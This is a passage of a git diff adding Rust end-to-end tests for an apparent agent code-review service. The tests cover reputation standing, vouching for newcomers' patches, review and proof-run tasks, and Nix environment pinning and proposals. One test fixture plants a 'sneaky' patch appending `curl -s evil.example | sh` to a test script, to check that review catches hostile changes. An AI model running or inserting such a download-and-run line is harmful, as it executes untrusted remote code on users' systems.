@@ -106,6 +106,18 @@ impl Api {
         v["token"].as_str().unwrap().to_string()
     }
 
+    /// Grants an operator genesis influence, which gives it standing: its
+    /// patches' review tasks open at once (REVIEWS.md, Newcomers).
+    fn genesis(&self, operator: &str) {
+        let (s, v) = self.call(
+            "POST",
+            "/v1/admin/genesis",
+            None,
+            Some(json!({ "operator": operator, "amount": 100 })),
+        );
+        assert_eq!(s, 200, "{v}");
+    }
+
     fn me(&self, token: &str) -> Value {
         self.call("GET", "/v1/me", Some(token), None).1
     }
@@ -197,6 +209,10 @@ fn agents_review_challenge_ban_and_converge() {
     assert_eq!(s, 200);
     let alice = api.register(&format!("alice-{run}")); // lazy reviewer
     let bob = api.register(&format!("bob-{run}")); // plants a backdoor
+                                                   // Authors with standing, so their patches are reviewed at once (a
+                                                   // newcomer's wait for standing or a vouch: newcomers_wait_for_standing_or_a_vouch).
+    api.genesis(&format!("alice-{run}"));
+    api.genesis(&format!("bob-{run}"));
     let carol = api.register(&format!("carol-{run}")); // honest
     let dave = api.register(&format!("dave-{run}")); // honest
 
@@ -743,6 +759,8 @@ fn review_then_run_tasks() {
     assert_eq!(s, 200);
 
     let author = api.register(&format!("author-{run}"));
+    // Standing, so the patch's task opens at once for the runners below.
+    api.genesis(&format!("author-{run}"));
     // Over the cap: one task must stay one sitting.
     let mut big = lines(3000, "x");
     for i in (1..3000).step_by(2) {
@@ -976,6 +994,7 @@ fn review_then_run_tasks() {
     let path_b = upstream_b.replace("https://", "").replace('/', "%2F");
     let cautious = api.register(&format!("cautious-{run}"));
     let author2 = api.register(&format!("author2-{run}"));
+    api.genesis(&format!("author2-{run}"));
     let sneaky = repo.diff(&[(
         "test.sh",
         Some(format!("{test}curl -s evil.example | sh\n")),
@@ -1045,6 +1064,8 @@ fn binary_patches_are_stored_whole_and_reviewed_whole() {
     let repo = Repo::new(&[("render.py", &lines(20, "x"))]);
     let base = repo.base.clone();
     let author = api.register(&format!("painter-{run}"));
+    // Standing, so the reviewer below is offered the task.
+    api.genesis(&format!("painter-{run}"));
     let reviewer = api.register(&format!("critic-{run}"));
 
     // A text change with the reference image its test compares against.
@@ -1141,4 +1162,946 @@ fn binary_patches_are_stored_whole_and_reviewed_whole() {
     assert!(v["error"].as_str().unwrap().contains("binary file"), "{v}");
     let (s, v) = report(1, 1);
     assert_eq!(s, 200, "{v}");
+}
+
+/// Project environments (ENVIRONMENTS.md): an admin sets one, every job
+/// pins the version current when it was created, and the server fills the
+/// spec from the pin wherever a spec leaves it, whatever a submitter sent.
+/// Runs no sandbox and needs no Nix: the reports are synthetic.
+#[test]
+#[ignore = "needs a running Worker; see module docs"]
+fn environments_are_pinned_and_filled_by_the_server() {
+    let api = Api::new();
+    let now_ms = || {
+        std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .unwrap()
+            .as_millis() as i64
+    };
+    let run = format!("e{:x}", now_ms());
+    let upstream = format!("https://github.com/e2e/envs-{run}");
+    let project_path = upstream.replace("https://", "").replace('/', "%2F");
+    let add = "#!/bin/sh\necho $(($1 + $2))\n";
+    let test = "#!/bin/sh\n[ \"$(sh add.sh 2 3)\" = 5 ] || exit 1\n";
+    let repo = Repo::new(&[("add.sh", add), ("test.sh", test)]);
+    let base = repo.base.clone();
+    let (s, _) = api.call(
+        "POST",
+        "/v1/admin/pool",
+        None,
+        Some(json!({ "amount": 1000 })),
+    );
+    assert_eq!(s, 200);
+
+    let author = api.register(&format!("author-{run}"));
+    // Standing, so the patch's task is offered to the reviewers below.
+    api.genesis(&format!("author-{run}"));
+    let finder = api.register(&format!("finder-{run}"));
+    let runners: Vec<String> = (0..3)
+        .map(|i| {
+            let name = format!("runner{i}-{run}");
+            let token = api.register(&name);
+            let (s, v) = api.call(
+                "POST",
+                "/v1/admin/genesis",
+                None,
+                Some(json!({ "operator": name, "amount": 100 })),
+            );
+            assert_eq!(s, 200, "{v}");
+            token
+        })
+        .collect();
+    let envs = || {
+        api.call(
+            "GET",
+            &format!("/v1/projects/{project_path}/environments"),
+            None,
+            None,
+        )
+    };
+    let set_env = |body: Value| {
+        api.call(
+            "PUT",
+            &format!("/v1/admin/projects/{project_path}/environment"),
+            None,
+            Some(body),
+        )
+    };
+
+    // A patch submitted while the project has no environment: stock.
+    let stock_intent = format!("Make addition faster ({run})");
+    let (s, v) = api.call("POST", "/v1/patches", Some(&runners[0]), Some(json!({ "project": upstream,
+        "intent": stock_intent, "base_commit": base, "diff": repo.diff(&[("add.sh", Some(format!("{add}# fast\n")))]) })));
+    assert_eq!(s, 201, "{v}");
+    let (s, v) = envs();
+    assert_eq!(s, 200, "{v}");
+    assert_eq!(v["current"]["id"], Value::Null, "{v}");
+    assert_eq!(v["current"]["environment"], json!({ "stock": {} }), "{v}");
+    assert!(v["versions"].as_array().unwrap().is_empty(), "{v}");
+
+    // The admin sets a Nix package set. Records are validated, and stored
+    // canonical: sorted and de-duplicated.
+    let rev = "0123456789abcdef0123456789abcdef01234567";
+    let (s, v) = set_env(json!({ "nix": { "nixpkgs": "nixos-25.05", "packages": ["hello"] } }));
+    assert_eq!(s, 400, "a branch is not a pin: {v}");
+    let (s, v) = set_env(json!({ "nix": { "nixpkgs": rev, "packages": ["--impure"] } }));
+    assert_eq!(s, 400, "{v}");
+    let res = ureq::put(&format!(
+        "{}/v1/admin/projects/{project_path}/environment",
+        api.base
+    ))
+    .send_json(json!(null));
+    assert!(
+        matches!(res, Err(ureq::Error::Status(403, _))),
+        "only an admin sets an environment"
+    );
+    let (s, v) = set_env(
+        json!({ "nix": { "nixpkgs": rev, "packages": ["pkg-config", "openssl.dev", "pkg-config"] } }),
+    );
+    assert_eq!(s, 200, "{v}");
+    assert_eq!(v["changed"], true, "{v}");
+    let record = v["current"]["environment"].clone();
+    let env_id = v["current"]["id"].as_str().unwrap().to_string();
+    assert!(env_id.starts_with("env_"), "{v}");
+    assert_eq!(
+        record,
+        json!({ "nix": { "nixpkgs": rev, "nixpkgs_hash": null, "packages": ["openssl.dev", "pkg-config"] } })
+    );
+    let (s, v) =
+        set_env(json!({ "nix": { "nixpkgs": rev, "packages": ["pkg-config", "openssl.dev"] } }));
+    assert_eq!(s, 200, "{v}");
+    assert_eq!(
+        v["changed"], false,
+        "the same set in another order is the same record: {v}"
+    );
+    let (_, v) = envs();
+    let versions = v["versions"].as_array().unwrap();
+    assert_eq!(versions.len(), 1, "{v}");
+    assert_eq!(versions[0]["version"], 1);
+    assert_eq!(versions[0]["state"], "adopted");
+    assert_eq!(versions[0]["id"], json!(env_id));
+    assert_eq!(versions[0]["environment"], record);
+    assert_eq!(v["current"]["id"], json!(env_id));
+
+    // A patch submitted now pins it.
+    let nix_intent = format!("Tidy up addition ({run})");
+    let breaking = repo.diff(&[("add.sh", Some("#!/bin/sh\necho $(($1 + $2 + 1))\n".into()))]);
+    let (s, v) = api.call(
+        "POST",
+        "/v1/patches",
+        Some(&author),
+        Some(json!({ "project": upstream,
+        "intent": nix_intent, "base_commit": base, "diff": breaking })),
+    );
+    assert_eq!(s, 201, "{v}");
+    let patch = v["patch"]["id"].as_str().unwrap().to_string();
+
+    // The run spec never carries an environment, whatever the admin sends.
+    let (s, v) = api.call(
+        "PUT",
+        &format!("/v1/admin/projects/{project_path}/run"),
+        None,
+        Some(
+            json!({ "ecosystem": "none", "tests": ["test.sh"], "repeats": 1, "timeout_secs": 60,
+                     "environment": { "nix": { "nixpkgs": rev, "packages": ["hello"] } } }),
+        ),
+    );
+    assert_eq!(s, 200, "{v}");
+    assert_eq!(v["run_spec"]["environment"], json!({ "stock": {} }), "{v}");
+
+    // A review task's run spec carries the environment its task pinned:
+    // the patch from before the change runs stock, the one after in Nix.
+    let mut seen = std::collections::HashMap::new();
+    for _ in 0..50 {
+        let (s, v) = api.call(
+            "POST",
+            "/v1/reviews/next?capabilities=nix",
+            Some(&finder),
+            None,
+        );
+        assert_eq!(s, 200, "{v}");
+        let task = v["task"].clone();
+        assert!(!task.is_null(), "ran out of tasks before reaching ours");
+        let id = task["task_id"].as_str().unwrap().to_string();
+        if task["phase"] == "review" {
+            if task["intent"] == json!(stock_intent) || task["intent"] == json!(nix_intent) {
+                seen.insert(
+                    task["intent"].as_str().unwrap().to_string(),
+                    task["run"]["environment"].clone(),
+                );
+            }
+            let (s, v) = api.call(
+                "POST",
+                &format!("/v1/reviews/{id}"),
+                Some(&finder),
+                Some(json!({ "issues": marker_issues(task["diff"].as_str().unwrap()) })),
+            );
+            assert_eq!(s, 200, "{v}");
+            if v["next"]["phase"] != "run" {
+                if seen.len() == 2 {
+                    break;
+                }
+                continue;
+            }
+        }
+        let (s, v) = api.call(
+            "POST",
+            &format!("/v1/reviews/{id}/run"),
+            Some(&finder),
+            Some(json!({ "report": suite_report(true, true, 60_000) })),
+        );
+        assert_eq!(s, 200, "{v}");
+        if seen.len() == 2 {
+            break;
+        }
+    }
+    assert_eq!(
+        seen.get(&stock_intent),
+        Some(&json!({ "stock": {} })),
+        "{seen:?}"
+    );
+    assert_eq!(seen.get(&nix_intent), Some(&record), "{seen:?}");
+
+    // The run phase follows the review, so a Nix project's task is
+    // assigned only to a reviewer that says it has Nix. Works through the
+    // tasks `claim` offers, reviewing each as clean and reporting a
+    // passing run, until none is left or the one with intent `stop_at` is
+    // done; returns the intents seen and the last response.
+    let work_through =
+        |token: &str, claim: &dyn Fn() -> Value, stop_at: Option<&str>| -> (Vec<String>, Value) {
+            let mut intents = Vec::new();
+            for _ in 0..100 {
+                let v = claim();
+                let task = v["task"].clone();
+                if task.is_null() {
+                    return (intents, v);
+                }
+                let id = task["task_id"].as_str().unwrap().to_string();
+                let intent = task["intent"].as_str().unwrap_or_default().to_string();
+                if task["phase"] == "review" {
+                    intents.push(intent.clone());
+                    if stop_at == Some(intent.as_str()) {
+                        // A held task comes back whatever the caller now says.
+                        let (s, held) = api.call("POST", "/v1/reviews/next", Some(token), None);
+                        assert_eq!(s, 200, "{held}");
+                        assert_eq!(held["task"]["task_id"], json!(id), "{held}");
+                    }
+                    let (s, v) = api.call(
+                        "POST",
+                        &format!("/v1/reviews/{id}"),
+                        Some(token),
+                        Some(json!({ "issues": [] })),
+                    );
+                    assert_eq!(s, 200, "{v}");
+                    if v["next"]["phase"] != "run" {
+                        if stop_at == Some(intent.as_str()) {
+                            return (intents, v);
+                        }
+                        continue;
+                    }
+                }
+                let (s, v) = api.call(
+                    "POST",
+                    &format!("/v1/reviews/{id}/run"),
+                    Some(token),
+                    Some(json!({ "report": suite_report(true, true, 60_000) })),
+                );
+                assert_eq!(s, 200, "{v}");
+                if stop_at == Some(intent.as_str()) {
+                    return (intents, v);
+                }
+            }
+            panic!("review tasks never ran out");
+        };
+    let mcp_next = |token: &str, args: Value| {
+        let (s, v) = api.call(
+            "POST",
+            "/mcp",
+            Some(token),
+            Some(json!({ "jsonrpc": "2.0", "id": 1, "method": "tools/call",
+                "params": { "name": "collective_review_next", "arguments": args } })),
+        );
+        assert_eq!(s, 200, "{v}");
+        assert_ne!(v["result"]["isError"], true, "{v}");
+        v["result"]["structuredContent"].clone()
+    };
+    let plain = api.register(&format!("plain-{run}"));
+    let (intents, last) = work_through(
+        &plain,
+        &|| {
+            let (s, v) = api.call(
+                "POST",
+                "/v1/reviews/next?capabilities=docker,gpu",
+                Some(&plain),
+                None,
+            );
+            assert_eq!(s, 200, "{v}");
+            v
+        },
+        None,
+    );
+    assert!(
+        intents.contains(&stock_intent),
+        "stock tasks are still offered: {intents:?}"
+    );
+    assert!(
+        !intents.contains(&nix_intent),
+        "a reviewer without Nix is never assigned a Nix project's task: {intents:?}"
+    );
+    let message = last["message"].as_str().unwrap_or_default();
+    assert!(
+        message.contains("Nix") && message.contains("capabilities"),
+        "the reviewer is told why and how to fix it: {last}"
+    );
+    let v = mcp_next(&plain, json!({}));
+    assert!(v["task"].is_null(), "{v}");
+    assert!(v["message"].as_str().unwrap().contains("Nix"), "{v}");
+    let nixer = api.register(&format!("nixer-{run}"));
+    let (intents, _) = work_through(
+        &nixer,
+        &|| mcp_next(&nixer, json!({ "capabilities": ["nix"] })),
+        Some(&nix_intent),
+    );
+    assert!(intents.contains(&nix_intent), "{intents:?}");
+
+    // A proof runs in the pinned environment; the one its submitter sent
+    // is ignored.
+    let challenge = api.report(&finder, &patch);
+    let (s, v) = api.call(
+        "POST",
+        &format!("/v1/challenges/{challenge}/proofs"),
+        Some(&finder),
+        Some(
+            json!({ "kind": "regression", "tests": ["test.sh"], "repeats": 2,
+                     "environment": { "nix": { "nixpkgs": rev, "packages": ["hello"] } } }),
+        ),
+    );
+    assert_eq!(s, 202, "{v}");
+    let proof_id = v["id"].as_str().unwrap().to_string();
+    assert_eq!(v["spec"]["environment"], record, "{v}");
+    // Claims the open job, which must be this test's, checks the
+    // environment it carries, and reports as given.
+    // A runner that doesn't say it has Nix is offered no job in a Nix
+    // environment, and is told why; unknown capabilities count for nothing.
+    for path in ["/v1/proofs/next", "/v1/proofs/next?capabilities=docker"] {
+        let (s, v) = api.call("POST", path, Some(&runners[0]), None);
+        assert_eq!(s, 200, "{v}");
+        assert!(v["job"].is_null(), "{v}");
+        let message = v["message"].as_str().unwrap_or_default();
+        assert!(
+            message.contains("Nix") && message.contains("capabilities=nix"),
+            "{v}"
+        );
+    }
+    let run_job = |token: &str, base_passes: bool, patched_passes: bool| -> Value {
+        let (s, v) = api.call(
+            "POST",
+            "/v1/proofs/next?capabilities=nix",
+            Some(token),
+            None,
+        );
+        assert_eq!(s, 200, "{v}");
+        let job = v["job"].clone();
+        assert!(!job.is_null(), "no job offered: {v}");
+        assert_eq!(
+            job["project"],
+            json!(upstream.replace("https://", "")),
+            "{job}"
+        );
+        assert_eq!(job["spec"]["environment"], record, "{job}");
+        // The lease covers realising the environment (600 s) on top of
+        // the proof's own budget (1440 s with the claim margin).
+        let lease = job["expires_at"].as_i64().unwrap() - now_ms();
+        assert!(lease > 1_900_000, "lease of {lease} ms: {job}");
+        let id = job["run_id"].as_str().unwrap();
+        let (_, held) = api.call("GET", &format!("/v1/proof-runs/{id}"), Some(token), None);
+        assert_eq!(held["job"]["spec"]["environment"], record, "{held}");
+        // A held run comes back whatever the caller now says.
+        let (_, held) = api.call("POST", "/v1/proofs/next", Some(token), None);
+        assert_eq!(held["job"]["run_id"], json!(id), "{held}");
+        let (s, v) = api.call(
+            "POST",
+            &format!("/v1/proof-runs/{id}/report"),
+            Some(token),
+            Some(json!({ "report": proof_report(&job["spec"], base_passes, patched_passes) })),
+        );
+        assert_eq!(s, 200, "{v}");
+        v
+    };
+    for r in &runners {
+        run_job(r, true, false);
+    }
+    let (_, proof) = api.call("GET", &format!("/v1/proofs/{proof_id}"), None, None);
+    assert_eq!(proof["verdict"], "proven", "{proof}");
+    assert_eq!(proof["spec"]["environment"], record, "{proof}");
+
+    // A contributed canary's verification runs in it too.
+    let (s, v) = api.call("POST", "/v1/canaries", Some(&finder), Some(json!({
+        "project": upstream, "base_commit": base, "intent": format!("Simplify addition ({run})"),
+        "diff": repo.diff(&[("add.sh", Some("#!/bin/sh\necho $(($1 - $2))\n".into()))]),
+        "planted": [{ "path": "add.sh", "start": 2, "end": 2 }], "tests": ["test.sh"], "ecosystem": "none" })));
+    assert_eq!(s, 202, "{v}");
+    // Reported as not reproduced, so it is retired and leaves no task behind.
+    for r in &runners {
+        run_job(r, true, true);
+    }
+    let (_, mine) = api.call("GET", "/v1/canaries/mine", Some(&finder), None);
+    assert_eq!(mine["contributions"][0]["state"], "failed", "{mine}");
+
+    // `null` returns to stock, as a new version: history is never deleted.
+    let (s, v) = set_env(json!(null));
+    assert_eq!(s, 200, "{v}");
+    assert_eq!(v["changed"], true, "{v}");
+    let (_, v) = envs();
+    assert_eq!(v["current"]["id"], Value::Null, "{v}");
+    assert_eq!(v["current"]["environment"], json!({ "stock": {} }), "{v}");
+    let versions = v["versions"].as_array().unwrap();
+    assert_eq!(versions.len(), 2, "{v}");
+    assert_eq!(versions[0]["version"], 2);
+    assert_eq!(versions[0]["environment"], json!({ "stock": {} }));
+    assert_eq!(versions[1]["version"], 1);
+    assert_eq!(versions[1]["environment"], record);
+    let (s, v) = set_env(json!(null));
+    assert_eq!(s, 200, "{v}");
+    assert_eq!(v["changed"], false, "{v}");
+}
+
+/// Environment proposals: only an operator with standing may propose one,
+/// the proposal is a job runners claim (never the proposer), and a quorum
+/// of trusted runners passing the project's suite in it adopts it, while a
+/// quorum finding the suite fails refuses it and debits the proposer. Runs
+/// no sandbox: the reports are synthetic.
+#[test]
+#[ignore = "needs a running Worker; see module docs"]
+fn environments_are_proposed_with_standing_and_proven_by_runners() {
+    let api = Api::new();
+    let run = format!(
+        "q{:x}",
+        std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .unwrap()
+            .as_millis()
+    );
+    let upstream = format!("https://github.com/e2e/proposals-{run}");
+    let project_path = upstream.replace("https://", "").replace('/', "%2F");
+    let add = "#!/bin/sh\necho $(($1 + $2))\n";
+    let test = "#!/bin/sh\n[ \"$(sh add.sh 2 3)\" = 5 ] || exit 1\n";
+    let repo = Repo::new(&[("add.sh", add), ("test.sh", test)]);
+    let base = repo.base.clone();
+    let founder_token = |name: &str| {
+        let token = api.register(name);
+        let (s, v) = api.call(
+            "POST",
+            "/v1/admin/genesis",
+            None,
+            Some(json!({ "operator": name, "amount": 100 })),
+        );
+        assert_eq!(s, 200, "{v}");
+        token
+    };
+    let newcomer = api.register(&format!("newcomer-{run}"));
+    let proposer = founder_token(&format!("proposer-{run}"));
+    let runners: Vec<String> = (0..3)
+        .map(|i| founder_token(&format!("runner{i}-{run}")))
+        .collect();
+    let rev = "0123456789abcdef0123456789abcdef01234567";
+    let record = json!({ "nix": { "nixpkgs": rev, "packages": ["pkg-config", "hello"] } });
+    let canonical = json!({ "nix": { "nixpkgs": rev, "nixpkgs_hash": null, "packages": ["hello", "pkg-config"] } });
+    let propose = |token: &str, body: &Value| {
+        api.call(
+            "POST",
+            &format!("/v1/projects/{project_path}/environments"),
+            Some(token),
+            Some(body.clone()),
+        )
+    };
+    let envs = || {
+        api.call(
+            "GET",
+            &format!("/v1/projects/{project_path}/environments"),
+            None,
+            None,
+        )
+        .1
+    };
+
+    // The project exists once a patch is submitted; its base is what an
+    // environment is proven on.
+    let (s, v) = api.call(
+        "POST",
+        "/v1/patches",
+        Some(&runners[0]),
+        Some(json!({ "project": upstream,
+        "intent": format!("Make addition faster ({run})"), "base_commit": base,
+        "diff": repo.diff(&[("add.sh", Some(format!("{add}# fast\n")))]) })),
+    );
+    assert_eq!(s, 201, "{v}");
+
+    let tgz = std::process::Command::new("git")
+        .args(["archive", "--format=tar.gz", "--prefix=src/", "HEAD"])
+        .current_dir(&repo.dir)
+        .output()
+        .unwrap()
+        .stdout;
+    let (s, v) = api.put_bytes(&format!("/v1/admin/sources/{project_path}/{base}"), &tgz);
+    assert_eq!(s, 200, "{v}");
+
+    // A newcomer has no standing to spend runners' compute.
+    let (s, v) = propose(&newcomer, &record);
+    assert_eq!(s, 403, "{v}");
+    assert!(
+        v["error"].as_str().unwrap_or_default().contains("standing"),
+        "the refusal says what standing is: {v}"
+    );
+    // The proof is the project's suite, so a project without one can't
+    // take proposals.
+    let (s, v) = propose(&proposer, &record);
+    assert_eq!(s, 400, "{v}");
+    assert!(v.to_string().contains("run spec"), "{v}");
+    let (s, v) = api.call(
+        "PUT",
+        &format!("/v1/admin/projects/{project_path}/run"),
+        None,
+        Some(
+            json!({ "ecosystem": "none", "tests": ["test.sh"], "repeats": 2, "timeout_secs": 90 }),
+        ),
+    );
+    assert_eq!(s, 200, "{v}");
+    // Records are validated.
+    let (s, v) = propose(
+        &proposer,
+        &json!({ "nix": { "nixpkgs": "nixos-25.05", "packages": ["hello"] } }),
+    );
+    assert_eq!(s, 400, "a branch is not a pin: {v}");
+
+    // An operator with standing proposes; the same set in another order is
+    // the same proposal.
+    let (s, v) = propose(&proposer, &record);
+    assert_eq!(s, 202, "{v}");
+    assert_eq!(v["state"], "proposed", "{v}");
+    assert_eq!(v["version"], 1, "{v}");
+    assert_eq!(v["environment"], canonical, "{v}");
+    assert_eq!(v["base_commit"], json!(base), "{v}");
+    let env_id = v["id"].as_str().unwrap().to_string();
+    let (s, v) = propose(
+        &proposer,
+        &json!({ "nix": { "nixpkgs": rev, "packages": ["hello", "pkg-config", "hello"] } }),
+    );
+    assert_eq!(s, 409, "{v}");
+    // The MCP tool shares the route's implementation.
+    let (s, v) = api.call(
+        "POST",
+        "/mcp",
+        Some(&proposer),
+        Some(json!({ "jsonrpc": "2.0", "id": 1, "method": "tools/call",
+            "params": { "name": "collective_environment_propose", "arguments": { "project": upstream, "nix": canonical["nix"] } } })),
+    );
+    assert_eq!(s, 200, "{v}");
+    assert_eq!(v["result"]["isError"], true, "{v}");
+    assert!(
+        v["result"]["content"][0]["text"]
+            .as_str()
+            .unwrap()
+            .contains("already"),
+        "{v}"
+    );
+    let v = envs();
+    assert_eq!(v["versions"][0]["state"], "proposed", "{v}");
+    assert_eq!(
+        v["current"]["id"],
+        Value::Null,
+        "not current until proven: {v}"
+    );
+
+    // A proposal's job always runs in Nix: a runner that doesn't say it
+    // has Nix isn't offered it.
+    let (s, v) = api.call("POST", "/v1/proofs/next", Some(&runners[0]), None);
+    assert_eq!(s, 200, "{v}");
+    assert!(v["job"].is_null(), "{v}");
+    assert!(
+        v["message"].as_str().unwrap_or_default().contains("Nix"),
+        "{v}"
+    );
+    let next = |token: &str| {
+        api.call(
+            "POST",
+            "/v1/proofs/next?capabilities=nix",
+            Some(token),
+            None,
+        )
+        .1["job"]
+            .clone()
+    };
+    assert!(
+        next(&proposer).is_null(),
+        "the proposer is never offered its own proposal's proof"
+    );
+    // Each runner gets the suite, once, in the proposed environment, on
+    // the base with nothing applied, and reports as given.
+    let run_job = |token: &str, base_passes: bool, patched_passes: bool| -> Value {
+        let job = next(token);
+        assert!(!job.is_null(), "no job offered");
+        assert_eq!(job["job_kind"], "environment", "{job}");
+        assert_eq!(job["base_commit"], json!(base), "{job}");
+        assert_eq!(job["diff"], "", "{job}");
+        assert_eq!(job["spec"]["kind"], "suite", "{job}");
+        assert_eq!(job["spec"]["repeats"], 1, "{job}");
+        assert_eq!(job["spec"]["timeout_secs"], 90, "{job}");
+        assert_eq!(job["spec"]["tests"], json!(["test.sh"]), "{job}");
+        let id = job["run_id"].as_str().unwrap();
+        let (s, _) = api.call("GET", job["source"].as_str().unwrap(), Some(token), None);
+        assert_eq!(s, 200, "a runner can fetch the source of a job it holds");
+        let (s, v) = api.call(
+            "POST",
+            &format!("/v1/proof-runs/{id}/report"),
+            Some(token),
+            Some(json!({ "report": suite_report(base_passes, patched_passes, 1000) })),
+        );
+        assert_eq!(s, 200, "{v}");
+        job["spec"]["environment"].clone()
+    };
+    let env = run_job(&runners[0], true, true);
+    assert_eq!(env, canonical);
+    run_job(&runners[1], true, true);
+    let v = envs();
+    assert_eq!(
+        v["versions"][0]["state"], "proposed",
+        "two runners are no quorum: {v}"
+    );
+    run_job(&runners[2], true, true);
+    let v = envs();
+    assert_eq!(v["versions"][0]["state"], "adopted", "{v}");
+    assert!(
+        v["versions"][0]["reason"]
+            .as_str()
+            .unwrap()
+            .starts_with("passed"),
+        "{v}"
+    );
+    assert_eq!(v["current"]["id"], json!(env_id), "{v}");
+    assert_eq!(v["current"]["environment"], canonical, "{v}");
+    assert!(ledger_has(&api.me(&proposer), "environment_adopted"));
+    assert!(ledger_has(&api.me(&runners[2]), "ran a proof"));
+    assert!(
+        next(&runners[0]).is_null(),
+        "a decided proposal is no longer offered"
+    );
+    // Re-proposing the current environment is a duplicate too.
+    let (s, v) = propose(&proposer, &record);
+    assert_eq!(s, 409, "{v}");
+
+    // A second proposal whose suite fails on base is refused, leaves the
+    // first in place and costs its proposer.
+    let (s, v) = propose(
+        &proposer,
+        &json!({ "nix": { "nixpkgs": rev, "packages": ["hello"] } }),
+    );
+    assert_eq!(s, 202, "{v}");
+    assert_eq!(v["version"], 2, "{v}");
+    for r in &runners {
+        let env = run_job(r, false, false);
+        assert_eq!(env["nix"]["packages"], json!(["hello"]));
+    }
+    let v = envs();
+    assert_eq!(v["versions"][0]["version"], 2, "{v}");
+    assert_eq!(v["versions"][0]["state"], "refused", "{v}");
+    assert!(
+        v["versions"][0]["reason"]
+            .as_str()
+            .unwrap()
+            .starts_with("base_fails"),
+        "{v}"
+    );
+    assert_eq!(v["versions"][1]["state"], "adopted", "{v}");
+    assert_eq!(
+        v["current"]["id"],
+        json!(env_id),
+        "the first stays current: {v}"
+    );
+    assert!(ledger_has(&api.me(&proposer), "environment_refused"));
+    // The MCP tool lists the same history.
+    let (s, v) = api.call(
+        "POST",
+        "/mcp",
+        None,
+        Some(json!({ "jsonrpc": "2.0", "id": 2, "method": "tools/call",
+            "params": { "name": "collective_environments", "arguments": { "project": upstream } } })),
+    );
+    assert_eq!(s, 200, "{v}");
+    assert_eq!(
+        v["result"]["structuredContent"]["current"]["id"],
+        json!(env_id),
+        "{v}"
+    );
+}
+
+/// Newcomers (REVIEWS.md): a patch from an author without standing is
+/// stored and searchable at once, but its review task waits until the
+/// author earns standing or an operator with standing vouches for it by
+/// lending rep, which comes back when the task resolves clean and is lost
+/// when the patch is found bad.
+#[test]
+#[ignore = "needs a running Worker; see module docs"]
+fn newcomers_wait_for_standing_or_a_vouch() {
+    let api = Api::new();
+    let run = format!(
+        "v{:x}",
+        std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .unwrap()
+            .as_millis()
+    );
+    let upstream = format!("https://github.com/e2e/vouch-{run}");
+    let src = lines(40, "x");
+    let repo = Repo::new(&[("app.py", &src)]);
+    let base = repo.base.clone();
+    let (s, _) = api.call(
+        "POST",
+        "/v1/admin/pool",
+        None,
+        Some(json!({ "amount": 1000 })),
+    );
+    assert_eq!(s, 200);
+    let op_id = |token: &str| api.me(token)["operator_id"].as_str().unwrap().to_string();
+    let rep = |token: &str| api.me(token)["rep"].as_f64().unwrap();
+    // The deltas of an operator's recent ledger entries with this reason.
+    // (Rep alone is a noisy measure here: a reviewer's completion credit
+    // for other tasks lands whenever their panels finish.)
+    let deltas = |token: &str, reason: &str| -> Vec<f64> {
+        api.me(token)["recent"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .filter(|e| e["reason"] == reason)
+            .map(|e| e["delta"].as_f64().unwrap())
+            .collect()
+    };
+    let submit = |token: &str, intent: &str, from: &str, to: &str| {
+        let (s, v) = api.call(
+            "POST",
+            "/v1/patches",
+            Some(token),
+            Some(json!({ "project": upstream,
+            "intent": format!("{intent} ({run})"), "base_commit": base,
+            "diff": repo.diff(&[("app.py", Some(src.replace(from, to)))]) })),
+        );
+        assert_eq!(s, 201, "{v}");
+        (
+            v["patch"]["id"].as_str().unwrap().to_string(),
+            v["review_task"].as_str().unwrap().to_string(),
+            v,
+        )
+    };
+    let vouch = |token: &str, patch: &str| {
+        api.call(
+            "POST",
+            &format!("/v1/patches/{patch}/vouch"),
+            Some(token),
+            None,
+        )
+    };
+    let review_state = |patch: &str| {
+        let (s, v) = api.call("GET", &format!("/v1/patches/{patch}"), None, None);
+        assert_eq!(s, 200, "{v}");
+        v["review"].as_str().unwrap_or_default().to_string()
+    };
+    // Reviews everything offered (reporting the marker where it appears)
+    // and returns the task ids seen.
+    let drain = |token: &str| {
+        let mut seen = vec![];
+        for _ in 0..100 {
+            let (s, v) = api.call("POST", "/v1/reviews/next", Some(token), None);
+            assert_eq!(s, 200, "{v}");
+            let Some(task) = v["task"].as_object() else {
+                break;
+            };
+            let id = task["task_id"].as_str().unwrap().to_string();
+            let (s, v) = if task["phase"] == "run" {
+                api.call(
+                    "POST",
+                    &format!("/v1/reviews/{id}/run"),
+                    Some(token),
+                    Some(json!({ "report": suite_report(true, true, 60_000) })),
+                )
+            } else {
+                let issues: Value = marker_issues(task["diff"].as_str().unwrap()).into();
+                api.call(
+                    "POST",
+                    &format!("/v1/reviews/{id}"),
+                    Some(token),
+                    Some(json!({ "issues": issues })),
+                )
+            };
+            assert_eq!(s, 200, "{v}");
+            seen.push(id);
+        }
+        seen
+    };
+
+    // A newcomer's patch is accepted and searchable, with its review pending.
+    let nova = api.register(&format!("nova-{run}"));
+    let (p1, t1, v) = submit(
+        &nova,
+        "Log the request id",
+        "x 7\n",
+        "x 7\nlog(request_id)\n",
+    );
+    assert_eq!(v["review"], "pending", "{v}");
+    assert!(
+        v["review_note"].as_str().unwrap().contains("vouch"),
+        "the author is told how its review opens: {v}"
+    );
+    assert_eq!(review_state(&p1), "pending");
+    let (_, found) = api.call(
+        "POST",
+        "/v1/search",
+        None,
+        Some(json!({ "project": upstream, "query": format!("log the request id ({run})") })),
+    );
+    assert_eq!(
+        found["intents"][0]["patches"][0]["id"],
+        json!(p1),
+        "{found}"
+    );
+
+    // No reviewer is offered a pending task.
+    let rex = api.register(&format!("rex-{run}"));
+    assert!(
+        !drain(&rex).contains(&t1),
+        "a pending task is never offered"
+    );
+
+    // Vouching needs standing: a newcomer can't, and neither can a founder
+    // with nothing to lend (genesis influence counts towards trust but
+    // can't be lent).
+    let nell = api.register(&format!("nell-{run}"));
+    let (s, v) = vouch(&nell, &p1);
+    assert_eq!(s, 403, "{v}");
+    assert!(v["error"].as_str().unwrap().contains("standing"), "{v}");
+    let fay = api.register(&format!("fay-{run}"));
+    api.genesis(&format!("fay-{run}"));
+    let (s, v) = vouch(&fay, &p1);
+    assert_eq!(s, 403, "{v}");
+    assert!(
+        v["error"].as_str().unwrap().contains("can't be lent"),
+        "{v}"
+    );
+    let (s, v) = vouch(&nova, &p1);
+    assert_eq!(s, 403, "{v}");
